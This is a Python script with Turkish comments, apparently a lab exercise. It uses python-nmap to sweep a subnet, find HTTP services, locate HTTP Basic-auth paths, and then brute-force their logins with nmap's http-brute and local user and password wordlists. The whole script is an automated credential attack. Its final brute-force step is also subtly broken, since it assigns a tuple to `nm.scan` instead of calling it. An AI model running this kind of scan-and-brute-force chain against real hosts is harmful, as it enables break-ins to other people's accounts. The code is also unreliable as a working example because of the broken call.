# Terminalden nmap scriptlerini listeleme
# locate *.nse
# locate *.nse | grep http
# /usr/share/nmap/scripts/http-auth-finder.nse
# terminalden taramak :  nmap 10.0.2.6 -p80,8180 --script /usr/share/nmap/scripts/http-auth-finder.nse



# port taraması yaptık ,http çalıştıran portları bulduk ,daha sonra http basic yöntemiyle authentication yaptığımız yerleri bulduk
import nmap
import re   # regex kütüphanesi eklendi https://regex101.com/

nm = nmap.PortScanner()

ip_range = "10.0.2.1/24"

nm.scan(ip_range, arguments="-sn")

# Host taraması yapılır, açıp IP bulunur
#for host in nm.all_hosts() :
	#print(host)


ip_list = ' '.join(nm.all_hosts() )

# print(ip_list)




#Servis taraması
nm.scan (ip_list, arguments='-sV')
# print(nm.scaninfo() )



http_ip_list = []
http_port_list = []

for ip in nm.all_hosts() :
	if "tcp" in nm[ip]:
		#print ( nm[ip]['tcp'].keys() )
		#print("---"*20)

		for port in nm[ip]['tcp'].keys() :
			#print( nm[ip]['tcp'][port] )

			if ( nm[ip]['tcp'][port]['name'] == "http" ) :
				name = nm[ip]['tcp'][port]['name']
				product = nm[ip]['tcp'][port]['product']
				version = nm[ip]['tcp'][port]['version']
				print (ip, port , name, product,version)

				if ip not in http_ip_list :
					http_ip_list.append(ip)
				if port not in http_port_list:
					http_port_list.append(str(port) )


#print (http_ip_list)
#print (http_port_list)



# Scan etme
nm.scan(' '.join(http_ip_list),','.join(http_port_list), '--script http-auth-finder')
#print(nm.scaninfo() )
#print (nm.all_hosts() )


targets = []


# Portları yazdırma
for host in nm.all_hosts() :
	#print ( nm[host]['tcp'].keys() )
	for port in nm[host]['tcp'].keys():
		# print(nm[host]['tcp'][port])
		if "script" in nm[host]['tcp'][port] :
			#print ( nm[host]['tcp'][port]['script']['http-auth-finder'] )
			paths = re.findall ( host+ ":" +str(port) + "(.*)HTTP: Basic" , nm[host]['tcp'][port]['script']['http-auth-finder'] )

			for path in paths :
				#print(path)
				new_target = {"host":host , "port" :str(port) , "path" : path.strip() }
				targets.append(new_target)

print("Targets are : " , targets)


#Brute Force Attack Yapılması
#http server üzerine
# /usr/share/nmap/scripts/http-brute.nse

userdb ="/home/kali/Documents/socket_programming/nmap/user.txt"
passdb = "/home/kali/Documents/socket_programming/nmap/passdb.txt"

for target in targets:
	host = target['host']
	port = target ['port']
	path = target['path']

	nm.scan = (host ,port , '--script http-brute --script-args path='+path+' ,userdb=' +userdb + ' ,passdb=' + passdb)

	print ( nm[host]['tcp'][int(port)]['script'] )

	#creds = re.findall ("(.*)- Valid" , nm[host]['tcp'][int(port)]['script']['http-brute'])

	#for cred in creds :
	#	print(host+ ":" + port + path, " >> " , cred.strip() )




